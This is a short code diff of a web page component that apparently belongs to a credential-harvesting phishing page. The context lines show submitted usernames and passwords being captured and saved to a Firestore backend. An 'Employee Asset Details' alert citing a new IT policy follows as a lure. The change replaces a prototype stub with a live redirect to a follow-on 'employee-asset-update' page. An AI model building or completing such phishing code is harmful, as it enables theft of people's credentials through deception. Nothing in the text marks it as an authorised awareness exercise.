@@ -17,7 +17,7 @@ export default function Home() {
     // Capture credentials on the backend (saves to Firestore)
     await captureCredentials({ username, password });
     
-    // Show SweetAlert2 prompt
+    // Show SweetAlert2 prompt and then redirect
     Swal.fire({
       title: "Action Required: Employee Asset Details",
       text: "Please review and update your asset information in accordance with the new IT policy.",
@@ -27,8 +27,8 @@ export default function Home() {
       background: "#fff",
       color: "#333"
     }).then(() => {
-      // In a real scenario, you would redirect. For this prototype, we do nothing.
-      console.log("Alert closed. Would redirect to employee-asset-update.html");
+      // Redirect to the asset update page after pressing the button
+      window.location.href = "/employee-asset-update.html"; 
     });
   };
   
